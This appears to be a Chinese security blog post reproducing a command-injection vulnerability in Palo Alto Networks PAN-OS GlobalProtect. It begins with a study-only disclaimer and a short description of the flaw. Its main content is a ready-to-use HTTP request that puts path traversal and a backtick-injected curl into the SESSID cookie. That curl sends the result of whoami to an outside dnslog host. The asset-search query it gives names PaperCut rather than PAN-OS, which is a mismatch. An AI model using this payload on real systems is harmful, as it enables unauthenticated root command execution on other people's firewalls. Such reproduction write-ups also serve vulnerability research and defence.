#  漏洞复现 || Palo Alto Networks PAN-OS GlobalProtect 命令注入   
韩文庚  我爱林   2024-05-17 19:19  
  
## 免责声明  
  
**我爱林攻防研究院的技术文章仅供参考，****任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得利用网络从事危害国家安全、荣誉和利益****，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**  
## 漏洞描述  
  
Palo Alto Networks PAN-OS是一套专为其下一代防火墙 (NGFW) 产品开发的操作系统，提供了全面的网络安全功能，包括威胁防护，网络分段，远程访问等；GlobalProtect是Palo Alto Networks一套远程访问 VPN 解决方案，集成于PAN-OS系统中。GlobalProtect 命令注入漏洞情报。未经身份验证的攻击者可以利用该漏洞以ROOT权限执行任意命令。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlOgRoWnp1RQ1tf491AicTJicpib3WbqgibSt6sb9ibpf65q4ELAdPbn7EP1U3RW5OcLEVFxVU8C0HgMSsg/640?wx_fmt=png&from=appmsg "")  
## 资产确定  
```
fofa： body="PaperCut"
```  
## 漏洞复现  
  
  
1.利用如下PO  
C进行Dnslog外带  
```
POST /ssl-vpn/hipreport.esp HTTP/1.1
Host: {{Hostname}}
Cookie: SESSID=./../../../opt/panlogs/tmp/device_telemetry/minute/y`curl${IFS}http://utkmwudrkm.dgrh3.cn?test=$(whoami)`;
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlOgRoWnp1RQ1tf491AicTJicpiaulCcpWLJXNX800Yxfse4e1hha11wJoXkmC5vmh3LIl3YpYoZQb4fg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlOgRoWnp1RQ1tf491AicTJicpWSttTgiaOfS3axpicBQYOAO132yUaWI1wQR7hjAY1bXlXJaSchvKRY0A/640?wx_fmt=png&from=appmsg "")  
  
如有侵权，请联系删除  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
**点它，分享点赞在看都在这里**  
  
